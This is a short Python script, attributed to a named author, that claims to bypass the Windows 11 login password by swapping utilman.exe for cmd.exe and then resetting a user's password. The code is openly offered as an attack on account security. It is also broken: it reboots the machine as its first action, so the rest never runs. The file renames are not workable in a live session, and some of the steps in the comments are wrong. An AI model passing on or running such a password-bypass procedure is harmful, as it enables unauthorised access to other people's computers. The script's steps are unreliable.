import os
import subprocess
import pyfiglet

def print_name():
    """
    Function to print Harshit Vasoya .
    """
    name = pyfiglet.figlet_format("Harshit Vasoya")
    print(name)

def bypass_windows_password():
    """
    Function to bypass the Windows 11 password using the accessibility menu.
    """
    print_name()

    # Step 1: Restart the computer and press the left shift key to access the Advanced Startup Options.
    os.system('shutdown /r /t 0')

    # Step 2: Select Troubleshoot > Advanced Options > Command Prompt.
    subprocess.call(['cmd', '/c', 'start', 'cmd'])

    # Step 3: Check if there is a Windows directory (drive) and if it contains the Windows file.
    os.chdir('C:\\Windows\\System32')

    # Step 4: Rename utilman.exe to utilman1.exe using the ren command.
    os.rename('utilman.exe', 'utilman1.exe')

    # Step 5: Rename cmd.exe to utilman.exe to replace the command prompt with the accessibility menu.
    os.rename('cmd.exe', 'utilman.exe')

    # Step 6: Restart the computer and press the accessibility menu key (usually Fn + F5) to open the accessibility menu.
    os.system('shutdown /r /t 0')

    # Step 7: Select the Ease of Access Center icon and click on the Make the computer easier to use option.
    subprocess.call(['control', 'userpasswords1'])

    # Step 8: Select the user for whom you want to change the password and click on the Reset Password button.
    # Enter the new password and confirm it.
    # Close the accessibility menu and restart the computer to complete the password change.

    # Step 9: Open the command prompt utility.
    subprocess.call(['cmd'])

    # Step 10: Restore the original state by renaming utilman.exe back to cmd.exe and utilman1.exe back to utilman.exe.
    os.chdir('C:\\Windows\\System32')
    os.rename('utilman.exe', 'cmd.exe')
    os.rename('utilman1.exe', 'utilman.exe')

# Call the function to execute the password bypass process
bypass_windows_password()
